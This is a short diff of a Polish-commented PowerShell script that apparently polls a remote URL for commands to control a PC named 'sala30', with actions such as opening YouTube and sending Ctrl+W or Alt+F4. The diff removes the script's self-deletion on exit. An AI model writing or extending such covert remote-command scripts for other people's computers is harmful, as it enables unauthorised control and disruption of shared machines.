@@ -3,7 +3,6 @@ $computerName = "sala30"
 $youtubeUrl = "https://www.youtube.com/watch?v=DjDSUqTcrv4"
 $watchTime = 45
 $url = "https://wkrgames.com/guslarz/pr/start.txt"
-$scriptPath = $MyInvocation.MyCommand.Path
 $youtubeStarted = $false
 $ctrlWStarted = $false
 $altF4Started = $false
@@ -471,8 +470,7 @@ while ($true) {
             Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-2] Odstep zmieniony na 5 minut" -ForegroundColor Cyan
         }
         "-1" {
-            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-1] koncze program" -ForegroundColor Red
-            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }            
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-1] koncze program" -ForegroundColor Red      
             exit
         }
         "1" {
